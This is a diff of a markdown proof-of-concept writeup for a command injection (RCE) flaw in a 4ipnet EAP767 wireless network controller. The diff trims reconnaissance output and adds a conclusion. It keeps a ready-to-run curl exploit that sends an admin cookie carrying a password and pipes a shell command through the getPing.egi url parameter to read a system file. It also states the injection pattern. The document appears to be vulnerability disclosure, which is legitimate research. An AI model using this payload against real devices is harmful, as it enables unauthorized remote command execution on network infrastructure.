@@ -1,20 +1,6 @@
-# PoC for 4ipnet EAP 767
+# RCE PoC for 4ipnet/EAP767 device
 
-```zsh!
-❯ curl -I http://{host}/
-HTTP/1.1 302 Moved Temporarily
-Date: Mon, 15 Jan 2024 01:10:14 GMT
-Server: Mbedthis-Appweb/2.4.2
-Cache-Control: no-cache
-ETag: "29e-122-2b9cb3e0"
-Content-length: 88
-Connection: keep-alive
-Keep-Alive: timeout=60, max=100
-Location: http://{host}/login.asp
-```
-![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_1ab1ac81f80c42b992f6c4fc96be40e8.png)
-
-After accessing the login web page, it was discovered to be a 4ipnet wireless network controller
+The login web page is found , and it's used for 4ipnet wireless network controller
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_247c7496749603bc7b9772d11afd7ba4.png)
 
 
@@ -119,13 +105,16 @@ Inject Target with `ls -l` to display the current directory structure, file perm
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_caee4f89b8ef4271c2f50521c479fe61.png)
 
 
->Confirmed the presence of a Remote Code Execution (RCE) vulnerability in the product. Arbitrary commands can be executed by passing the url parameter: input_text + pipe + command
 
 ## Verify the device brand and model.
 ```zsh!
 curl -b "username=admin; password=17lgP6vqCV1Ko" "{host}/getPing.egi?url=|cat%20/etc/product.info"
 ```
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_c8581cfbd913fe193766cbad839cefc7.png)
+
+## Conclusion
+The presence of a Remote Code Execution (RCE) vulnerability is in the product. Arbitrary commands can be executed by passing the url parameter.
+
 ## Reference
 https://hkitblog.com/12770/
 https://www.lienshen.com.tw/sidebar1_01-2-11.html
